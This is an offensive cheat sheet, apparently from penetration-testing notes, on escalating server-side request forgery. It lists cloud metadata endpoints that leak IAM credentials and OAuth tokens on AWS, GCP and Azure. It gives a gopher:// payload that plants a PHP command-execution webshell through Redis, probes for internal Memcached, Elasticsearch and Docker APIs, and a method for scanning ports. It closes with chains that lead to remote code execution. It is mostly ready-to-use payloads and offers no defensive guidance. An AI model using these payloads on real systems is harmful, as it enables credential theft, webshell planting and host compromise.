# SSRF Escalation

## Cloud Metadata

### AWS

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
http://169.254.169.254/latest/user-data
```

**Impact:** IAM credentials → AWS account compromise

### GCP

```
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

Header required: `Metadata-Flavor: Google`

### Azure

```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Header required: `Metadata: true`

## Internal Services

### Redis (port 6379)

```
gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0ACONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0ACONFIG%20SET%20dbfilename%20shell.php%0ASAVE
```

### Memcached (port 11211)

```
dict://127.0.0.1:11211/stats
```

### Elasticsearch (port 9200)

```
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_search?q=*
```

### Docker API (port 2375)

```
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/images/json
```

**Impact:** Container escape, host compromise

## Port Scanning

Use SSRF to map internal network:

```
http://192.168.1.1:22
http://192.168.1.1:80
http://192.168.1.1:443
```

Note response differences (time, size, errors) to identify open ports.

## SSRF → RCE Chains

1. **SSRF + Redis** → Write webshell
2. **SSRF + Memcached** → Cache poisoning
3. **SSRF + Docker** → Container creation with mount
4. **SSRF + Internal admin** → Access unauth admin panel
5. **SSRF + Cloud metadata** → IAM creds → Cloud RCE

---

*More chains coming soon.*
